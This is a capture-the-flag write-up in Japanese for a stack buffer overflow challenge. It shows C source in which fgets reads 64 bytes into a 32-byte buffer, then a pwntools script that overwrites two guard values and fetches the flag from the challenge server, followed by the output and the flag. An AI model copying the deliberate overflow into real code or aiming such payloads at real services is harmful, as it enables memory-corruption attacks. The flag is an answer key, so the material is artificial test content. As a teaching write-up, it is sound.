# p0wn3d_2 - Pwn

You can scream... Whatever. Can you be precise tho?

nc p0wn3d2.kctf-453514-codelab.kctf.cloud 1337


解凍する
```
└─$ tar -xzvf dist.tar.gz
chal
main.c
```

main.c 
```
#include <stdio.h>
#include <string.h>
#include <unistd.h>

struct __attribute__((__packed__)) data {
  char buf[32];
  int guard1;
        int guard2;
};

void ignore(void)
{
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stdin, NULL, _IONBF, 0);
}

void get_flag(void)
{
  char flag[1024] = { 0 };
  FILE *fp = fopen("flag.txt", "r");
  fgets(flag, 1023, fp);
  printf(flag);
}

int main(void) 
{
  struct data second_words;
  ignore(); /* ignore this function */

  printf("I can't believe you just did that. Do you have anything to say for yourself?\n");
  fgets(second_words.buf, 64, stdin);
  sleep(2);
        puts("Yeah Yeah whatever");
        sleep(2);
        puts("I've got two guards now, what are you gonna do about it?");
        sleep(2);

  if (second_words.guard1 == 0xdeadbeef && second_words.guard2 == 0x0badc0de) {
    get_flag();
  }

  return 0;
}
```

分析
- buf が 32 バイト、guard1 と guard2 がそれぞれ 4 バイトとして定義
- fgets(second_words.buf, 64, stdin)で、32バイトのバッファに対して64バイトまで読み込もうとしている


## solve
バッファオーバーフローを利用する
- Aを32バイト送信してbufを埋める
- 次の4バイトにguard1の値（0xdeadbeef）をリトルエンディアン形式で設定
- 続く4バイトにguard2の値（0x0badc0de）をリトルエンディアン形式で設定

```
#!/usr/bin/env python3
from pwn import *

conn = remote('p0wn3d2.kctf-453514-codelab.kctf.cloud', 1337)

# エクスプロイトペイロードを構築
payload = b'A' * 32  # bufを埋める
payload += p32(0xdeadbeef)  # guard1 (リトルエンディアン)
payload += p32(0x0badc0de)  # guard2 (リトルエンディアン)

# 最初のプロンプトを読み込む
print(conn.recvline().decode())

# ペイロードを送信
conn.sendline(payload)

print(conn.recvall().decode())
```


出力
```
$$ python3 solve.py
[+] Opening connection to p0wn3d2.kctf-453514-codelab.kctf.cloud on port 1337: Done
== proof-of-work: disabled ==

[+] Receiving all data: Done (188B)
[*] Closed connection to p0wn3d2.kctf-453514-codelab.kctf.cloud port 1337
I can't believe you just did that. Do you have anything to say for yourself?
Yeah Yeah whatever
I've got two guards now, what are you gonna do about it?
wctf{4ll_y0uR_mEm_4r3_bel0ng_2_Us}
```

## flag
`wctf{4ll_y0uR_mEm_4r3_bel0ng_2_Us}`